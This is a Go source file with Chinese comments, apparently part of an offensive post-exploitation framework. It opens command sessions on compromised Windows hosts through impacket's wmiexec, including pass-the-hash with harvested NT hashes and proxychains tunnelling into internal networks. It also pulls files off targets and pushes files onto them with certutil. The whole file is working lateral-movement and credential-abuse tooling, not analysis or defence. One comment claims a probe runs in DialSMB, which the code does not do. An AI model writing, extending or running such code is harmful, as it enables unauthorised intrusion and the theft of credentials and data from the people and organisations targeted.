// smb_shell.go Windows 凭据会话（IIS/Windows 立足点的 SSH 对等物）。
//
// Windows 目标一般没有 sshd——凭据升级会话走 SMB+DCOM：wmiexec.py 每命令
// 一次非交互执行（支持密码与 NT hash 直通,收割到的 hash_nt 不破解直接当
// 会话用）。注册一个真实管理员通道后,session_cred_harvest 的 windows 包
// （cmdkey/PSHistory/reg save hive→离线 secretsdump）才有权限跑全。
package session

import (
	"context"
	"encoding/base64"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

// SMBSecret 是 smbexec 会话的连接参数（随 sessions.secret 落库）。
type SMBSecret struct {
	Host   string `json:"host"`
	User   string `json:"user"`   // DOMAIN\user 或 user（本地账号无前缀）
	Pass   string `json:"pass,omitempty"`
	Hash   string `json:"hash,omitempty"` // NT hash（pass-the-hash）
	ProxyC bool   `json:"proxychains,omitempty"`
}

// SMBShell 是 Session 的 wmiexec 实现。每条 Exec 起一次 wmiexec.py
// 非交互调用（一次 SMB 登录 ~2-6s）——比持久通道重，但零常驻、可恢复、
// 语义诚实（每条命令独立往返,无 shell 状态）。
type SMBShell struct {
	id  int64
	sec SMBSecret
}

// wmiexecBin 是 impacket wmiexec 可执行名。
const wmiexecBin = "wmiexec.py"

// DialSMB 验证参数并做一次探针执行（真实拨测，不伪造）。
func DialSMB(sec SMBSecret) (*SMBShell, error) {
	if sec.Host == "" || sec.User == "" {
		return nil, fmt.Errorf("host/user 必填")
	}
	if sec.Pass == "" && sec.Hash == "" {
		return nil, fmt.Errorf("需要 password 或 NT hash 其一")
	}
	sh := &SMBShell{sec: sec}
	return sh, nil
}

// RestoreSMBShell 恢复（wmiexec 无连接态,等价重建）。
func RestoreSMBShell(id int64, sec SMBSecret) (*SMBShell, error) {
	sh, err := DialSMB(sec)
	if err != nil {
		return nil, err
	}
	sh.id = id
	return sh, nil
}

func (s *SMBShell) ID() int64       { return s.id }
func (s *SMBShell) SetID(id int64)  { s.id = id }
func (s *SMBShell) Kind() string    { return "smbexec" }
func (s *SMBShell) Secret() SMBSecret { return s.sec }

// wmiArgs 组装调用：返回 (bin, args)。hash 优先于密码——hash 是收割直产物；
// ProxyC 时整包走 proxychains（经隧道出口打内网 SMB）。
func (s *SMBShell) wmiArgs(cmd string) (string, []string) {
	target := s.sec.User + "@" + s.sec.Host
	if s.sec.Pass != "" {
		target = s.sec.User + ":" + s.sec.Pass + "@" + s.sec.Host
	}
	args := []string{"-dc-ip", s.sec.Host}
	if s.sec.Hash != "" {
		args = append(args, "-hashes", ":"+s.sec.Hash)
	}
	args = append(args, target, cmd)
	if s.sec.ProxyC {
		return "proxychains", append([]string{"-q", wmiexecBin}, args...)
	}
	return wmiexecBin, args
}

// bannerRe 剥 impacket 非交互输出的横幅/状态行,只留命令回显。
var bannerRe = regexp.MustCompile(`(?m)^(Impacket v|\[\*\]|\[\!\]|\[\-\])[^\n]*\n?`)

func (s *SMBShell) run(ctx context.Context, cmd string, timeout time.Duration) (string, error) {
	if timeout <= 0 {
		timeout = 45 * time.Second // SMB 登录开销大,下限比 HTTP 通道宽
	}
	ectx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	bin, args := s.wmiArgs(cmd)
	c := exec.CommandContext(ectx, bin, args...)
	out, err := c.CombinedOutput()
	text := string(bannerRe.ReplaceAll(out, nil))
	text = strings.TrimSpace(text)
	if ectx.Err() != nil {
		return "", fmt.Errorf("smbexec 超时(%s)", timeout)
	}
	if err != nil {
		return text, fmt.Errorf("wmiexec 失败: %w: %s", err, truncText(text, 300))
	}
	return text, nil
}

// Test 无害探针。
func (s *SMBShell) Test(ctx context.Context) error {
	out, err := s.run(ctx, "echo __smbtest__", 30*time.Second)
	if err != nil {
		return err
	}
	if !strings.Contains(out, "__smbtest__") {
		return fmt.Errorf("探针回显异常: %s", truncText(out, 200))
	}
	return nil
}

// Exec 一条 cmd 命令一次 wmiexec 往返。cmd.exe 原生,`&` 分隔可用。
func (s *SMBShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	out, err := s.run(ctx, "cmd /c "+cmd, timeout)
	return out, "", err
}

// ReadFile certutil 编码回拉（二进制安全,cmd 内置工具免上传）。
func (s *SMBShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
	out, _, err := s.Exec(ctx, "certutil -encode -f "+cmdQuote(path)+" %TEMP%\\rfx.b64 & type %TEMP%\\rfx.b64", 60*time.Second)
	if err != nil {
		return nil, err
	}
	var b strings.Builder
	for _, ln := range strings.Split(out, "\n") {
		ln = strings.TrimSpace(ln)
		if ln == "" || strings.Contains(ln, "CERTIFICATE") {
			continue
		}
		b.WriteString(ln)
	}
	data, derr := base64.StdEncoding.DecodeString(b.String())
	if derr != nil {
		// 明文兜底（小文本文件直接 type）
		t, _, terr := s.Exec(ctx, "type "+cmdQuote(path), 45*time.Second)
		if terr != nil {
			return nil, err
		}
		return []byte(t), nil
	}
	return data, nil
}

// WriteFile 分块 certutil decode 落地。
func (s *SMBShell) WriteFile(ctx context.Context, path string, data []byte) error {
	const chunk = 64 * 1024 // wmiexec 单命令长度有限,小块多次
	tmp := "%TEMP%\\wfx.b64"
	for off := 0; off < len(data); off += chunk {
		end := off + chunk
		if end > len(data) {
			end = len(data)
		}
		op := ">"
		if off > 0 {
			op = ">>"
		}
		enc := base64.StdEncoding.EncodeToString(data[off:end])
		if _, _, err := s.Exec(ctx, "echo "+enc+" "+op+" "+tmp, 60*time.Second); err != nil {
			return err
		}
	}
	_, _, err := s.Exec(ctx, "certutil -decode -f "+tmp+" "+cmdQuote(path)+" & del "+tmp, 60*time.Second)
	return err
}

func (s *SMBShell) Close(context.Context) error { return nil }

func cmdQuote(p string) string {
	return `"` + strings.ReplaceAll(p, `"`, `\"`) + `"`
}

func truncText(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
